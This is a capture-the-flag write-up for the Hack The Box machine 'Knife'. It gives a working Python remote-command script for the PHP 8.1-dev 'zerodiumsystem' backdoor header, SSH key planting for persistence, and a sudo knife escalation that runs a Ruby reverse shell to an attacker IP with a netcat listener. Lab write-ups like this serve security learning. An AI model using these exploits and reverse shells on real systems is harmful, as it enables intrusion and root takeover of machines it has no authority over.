---
title: Knife
description: PHP 8.1 dev exploit
---

# Knife HTB

## PHP 8.1-dev exploit :

The **PHP** version used on the server has a backdour, you can exploit it through the **http-header** "User-agentt" (yes with 2 "t") followed by "zerodiumsystem(' your command ')".
Here is the script I made :

```py
import requests

while True:
    cmd = input('$ ')

    r = requests.get(f'http://knif.htb/',headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "User-Agentt": "zerodiumsystem('" + cmd + "');"
    })

    res = r.text.split('<!DOCTYPE html>')[0]

    print(res)
```

I used it to echo my **SSH** public key in the `/home/james/.ssh/authorized_keys` file.
Then I connected via ssh as user **james**.

Once connected I tried the usual `sudo -l` command and got a promissing result :

```bash
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

So I searched online how to execute ruby command with knife, I assumed it was **ruby** because the file stored at `/usr/bin/knife` was written is **ruby**.
I found this command :

```bash
knife exec -E 'ruby command'
```

With that in mind I headed to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby) and retrieved a ruby reverse shell :

```ruby
exit if fork;c=TCPSocket.new("<IP>","<PORT>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}
```

Finally I started a netcat on my machine to catch the connection from the reverse-shell, in the end it looked like this :

1.  on my machine

```bash
nc -lnvp <PORT>
```

2. on knife.htb

```bash
sudo knife exec -E 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

And voila we now have **root** access, for fun I coppied my ssh pubkey again to connect as **root**.

### Thank's for reading :)
